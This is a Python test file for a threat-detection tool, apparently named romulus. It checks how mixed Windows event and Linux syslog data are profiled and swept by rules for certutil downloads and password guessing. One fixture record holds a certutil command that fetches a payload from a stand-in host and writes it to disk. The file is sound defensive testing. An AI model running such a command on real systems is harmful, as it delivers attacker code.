"""Synthetic Windows and syslog shapes from EVTX JSON, Winlogbeat and RFC 3164 public specifications.

https://github.com/omerbenamram/evtx
https://www.elastic.co/guide/en/beats/winlogbeat/8.19/exported-fields-winlog.html
https://www.rfc-editor.org/rfc/rfc3164#section-4.1
"""
from collections import Counter
from copy import deepcopy
from datetime import timedelta

import pytest

from romulus.errors import SourceError
from romulus.sources.compile import compile_es
from romulus.sources.models import Predicate, SearchIntent
from romulus.sources.profile import build_profile, contract_from_types
from tests.test_host_shapes_profile import WINDOW, ProfileClient
from tests.throughput_fixture import _matches


class MixedProfileClient(ProfileClient):
    def __init__(self, count=2, failure=False):
        super().__init__(dynamic=False)
        self.fields.update({'message': 'text', 'log.file.path': 'keyword', 'log.offset': 'long'})
        self.count = count
        self.failure = failure

    def search(self, target, body):
        if 'must_not' in body.get('query', {}).get('bool', {}):
            self.bodies.append(body)
            if self.failure:
                raise SourceError('synthetic count failure')
            return {'hits': {'total': {'value': self.count, 'relation': 'eq'}, 'hits': []}}
        return super().search(target, body)


@pytest.mark.parametrize('count,flag', [(0, False), (2, True)])
def test_mixed_text_count_controls_flag_without_changing_zero_text_inventory(count, flag):
    client = MixedProfileClient(count=count)
    profile, contract = build_profile(client, 'raw')
    assert contract.linux_text_mixed is flag
    assert profile.model_dump().get('linux_text_mixed', False) is flag
    assert ('linux.text' in profile.datasets) is flag
    if not flag:
        assert 'linux_text' not in profile.model_dump()
        assert 'linux_text_mixed' not in contract.model_dump()


def test_failed_mixed_text_count_stays_unknown():
    profile, contract = build_profile(MixedProfileClient(failure=True), 'raw')
    assert contract.linux_text_mixed is None
    assert profile.model_dump()['linux_text_mixed'] is None
    assert any('mixed Linux text count unavailable' in note for note in profile.notes)


def test_mixed_text_selector_excludes_all_windows_markers():
    client = MixedProfileClient()
    contract = contract_from_types('raw', client.fields)
    query = compile_es(SearchIntent(kind='raw', target='raw', window=WINDOW,
        filters=[Predicate(field='event.dataset', op='eq', value='linux.text')]), contract).body['query']
    text = {'@timestamp': '2026-01-01T01:00:00Z', 'message': 'Nov  1 01:00:00 host sshd[1]: unknown',
            'log': {'file': {'path': '/var/log/auth.log'}}}
    assert _matches(query, text, '@timestamp')
    for markers in ({'winlog': {'channel': 'Security'}}, {'Event': {'System': {'Computer': 'WS01'}}},
                    {'Channel': 'Security'}, {'EventID': 4688}, {'SourceName': 'provider'}):
        assert not _matches(query, {**deepcopy(text), **markers}, '@timestamp')


def test_pure_linux_contract_and_selector_stay_unchanged():
    contract = contract_from_types('raw', {'@timestamp': 'date', 'message': 'text', 'log.file.path': 'keyword'})
    assert contract.os_family == 'linux' and 'linux_text_mixed' not in contract.model_dump()
    body = compile_es(SearchIntent(kind='raw', target='raw', window=WINDOW,
        filters=[Predicate(field='event.dataset', op='eq', value='linux.text')]), contract).body
    assert 'Event.System' not in str(body) and 'winlog' not in str(body)


def _mixed_documents():
    from tests.test_evtx_json import raw_hit, twin

    raw = raw_hit(data={'NewProcessName': r'C:\Windows\System32\certutil.exe', 'NewProcessId': '0x1234',
                       'CommandLine': 'certutil.exe -urlcache -split -f https://example.test/payload C:\\x.exe',
                       'SubjectUserName': 'operator'})
    stamp = (WINDOW.start + timedelta(hours=1)).isoformat()
    raw['_source']['@timestamp'] = stamp
    raw['_source']['Event']['System']['TimeCreated']['#attributes']['SystemTime'] = stamp
    raw['_index'], raw['_id'] = 'raw', 'evtx'
    winlog = twin(raw)
    winlog['_id'] = 'winlog'
    winlog['_source']['winlog']['time_created'] = stamp
    winlog['_source']['winlog']['record_id'] = 20
    winlog['_source']['message'] = 'A Windows rendered message, never a Linux line'
    rows = [raw, winlog]
    for service in ('sshd', 'dovecot'):
        for n in range(10):
            when = WINDOW.start + timedelta(hours=1, seconds=n)
            body = (f'sshd[42]: Failed password for alice from 192.0.2.8 port {4400+n} ssh2'
                    if service == 'sshd' else 'dovecot: imap-login: Disconnected (auth failed, 1 attempts): '
                    'user=<alice>, method=PLAIN, rip=192.0.2.8, lip=10.0.0.10')
            rows.append({'_index': 'raw', '_id': f'{service}-{n}', '_source': {
                '@timestamp': when.isoformat(), 'message': f'Jan  1 {when:%H:%M:%S} linux01 {body}',
                'log': {'file': {'path': '/var/log/auth.log'}, 'offset': n}, 'tags': ['synthetic']}})
    return rows


def _run_mixed(tmp_path, rows, *, count_failure=False):
    from romulus.config import Settings
    from romulus.detect.auth import SshPasswordGuessing
    from romulus.detect.service_auth import ServicePasswordGuessing
    from romulus.detect.windows_proxy import CertutilDownloadDecode
    from romulus.hunt.sweep import Sweep
    from romulus.sources.es import ElasticClient
    from tests.test_host_shapes_profile import mapping, types
    from tests.test_sweep import _repo
    from tests.throughput_fixture import MiniES, _path

    fields = {**types(), 'message': 'text', 'log.file.path': 'keyword', 'log.offset': 'long',
              'winlog.channel': 'keyword', 'winlog.provider_name': 'keyword', 'winlog.event_id': 'long',
              'winlog.computer_name': 'keyword', 'winlog.record_id': 'long', 'winlog.event_data': 'flattened'}
    native = MiniES({'raw': rows}, {'raw': '@timestamp'})

    class Preflight:
        settings, version = ProfileClient.settings, ProfileClient.version

        def mapping(self, target):
            return mapping(fields)

        def search(self, target, body):
            if count_failure and 'must_not' in body.get('query', {}).get('bool', {}):
                raise SourceError('synthetic text count failure')
            result = native._search(target, body)
            if 'hosts' in body.get('aggs', {}):
                matching = native._matching(target, body.get('query', {'bool': {}}))
                aggs = {'hosts': native._composite(matching, body['aggs']['hosts']), 'ds': {'buckets': []}}
                for key in ('tmin', 'tmax'):
                    stamps = [_path(row[2]['_source'], '@timestamp') for row in matching]
                    aggs[key] = {'value_as_string': (min if key == 'tmin' else max)(stamps)}
                result['aggregations'] = aggs
            return result

    profile, contract = build_profile(Preflight(), 'raw')
    client = ElasticClient(Settings(es_url='http://es.invalid'), transport=native.transport())
    repo = _repo()
    runner = Sweep(repo, client, 'h1', WINDOW, {'raw': contract}, stage_dir=tmp_path)
    runner.pack = [CertutilDownloadDecode(), SshPasswordGuessing(), ServicePasswordGuessing()]
    runner._profiles = {'raw': profile.model_dump()}
    try:
        runner.run_target('raw')
        runner.finalize()
        return runner.stats, repo.candidates('h1'), repo.rule_cells('h1'), profile, contract
    finally:
        runner.close_stage()
        repo.engine.dispose()


def test_profile_compile_real_sweep_finds_windows_ssh_and_service_auth_once(tmp_path):
    rows = _mixed_documents()
    stats, candidates, cells, profile, contract = _run_mixed(tmp_path, rows)
    assert contract.linux_text_mixed is True and profile.datasets['linux.text'] == 20
    assert stats['records'] == len(rows) and stats['errors'] == 0 and not stats.get('skips')
    assert stats['events'] == len(rows)
    assert {row['rule_id'] for row in candidates} == {
        'win.certutil_download_decode', 'host.ssh_password_guessing', 'auth.password_guessing'}
    assert sum(stats['windows_inventory']['raw']['counts'].values()) == 2
    assert not stats['windows_inventory']['raw']['reasons']
    assert not any('unsupported_records' in str(cell['detail']) for cell in cells)


def test_adding_text_keeps_windows_class_inventory_and_coverage_identical(tmp_path):
    rows = _mixed_documents()
    mixed, _c, mixed_cells, _p, _co = _run_mixed(tmp_path / 'mixed', rows)
    pure, _c, pure_cells, profile, contract = _run_mixed(tmp_path / 'pure', rows[:2])
    assert contract.linux_text_mixed is False and 'linux_text' not in profile.model_dump()
    assert pure['windows_inventory'] == mixed['windows_inventory']
    def windows_cells(cells):
        return [{name: cell[name] for name in ('target', 'partition', 'state', 'matched', 'evaluated', 'detail')}
                for cell in cells if cell['rule_id'] == 'win.certutil_download_decode']
    assert windows_cells(pure_cells) == windows_cells(mixed_cells)


@pytest.mark.parametrize('failure', [False, True])
def test_text_unknown_or_failed_count_is_scoped_away_from_windows(tmp_path, failure):
    rows = _mixed_documents()
    if not failure:
        rows.append({'_index': 'raw', '_id': 'stray', '_source': {
            '@timestamp': (WINDOW.start + timedelta(hours=1)).isoformat(), 'message': 'unrecognized synthetic line',
            'log': {'file': {'path': '/var/log/unknown.log'}}}})
    stats, candidates, cells, _profile, _contract = _run_mixed(tmp_path, rows, count_failure=failure)
    assert {row['rule_id'] for row in candidates} == {
        'win.certutil_download_decode', 'host.ssh_password_guessing', 'auth.password_guessing'}
    text = [cell for cell in cells if cell['rule_id'] != 'win.certutil_download_decode']
    assert text and any('partial' in cell['state'] for cell in text)
    reason = 'mixed Linux text count unavailable' if failure else 'text line in no recognized format'
    assert any(reason in str(cell['detail']) for cell in text)
    assert not any(reason in str(cell['detail']) for cell in cells
                   if cell['rule_id'] == 'win.certutil_download_decode')
    assert Counter(stats.get('skips', {})).total() == (0 if failure else 1)
